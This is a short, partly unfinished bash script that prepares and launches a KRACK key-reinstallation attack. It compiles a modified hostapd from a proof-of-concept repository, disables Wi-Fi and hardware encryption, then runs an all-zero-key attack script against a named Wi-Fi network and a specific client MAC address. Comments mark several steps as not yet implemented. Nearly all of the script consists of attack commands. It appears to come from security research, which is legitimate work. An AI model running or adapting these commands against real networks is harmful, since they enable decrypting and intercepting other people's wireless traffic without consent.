#!/bin/bash

# Install dependencies
echo "Setting up dependencies..."


# Make modified hostapd instance. Only needs to be done once
if [[ ! -x "./krackattacks-poc-zerokey/hostapd/hostapd" ]] 
then 
	echo "Compiling hostapd"
	cd ./krackattacks-poc-zerokey/hostapd/
	cp defconfig .config 
	make -j 2 > /dev/null
	cd ../../
fi

#Disable network
nmcli radio wifi off

# Disable hardware encryption, as bugs on some Wi-Fi network interface cards could interfere with the script used to check whether a client is vulnerable
## NOTE we should also make sure that this is reversed when the user is done... Perhaps make it an option
./findVulnerable/krackattack/disable-hwcrypto.sh

#Let user choose whether to reboot computer
## NOTE not implemented

#### NOTE: next sections not done

#RUN: systool -vm ath9k_htc

## To check: the nohwcript/.. param has been set.

#Look for key reinstallations in the 4-way handshake
./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa

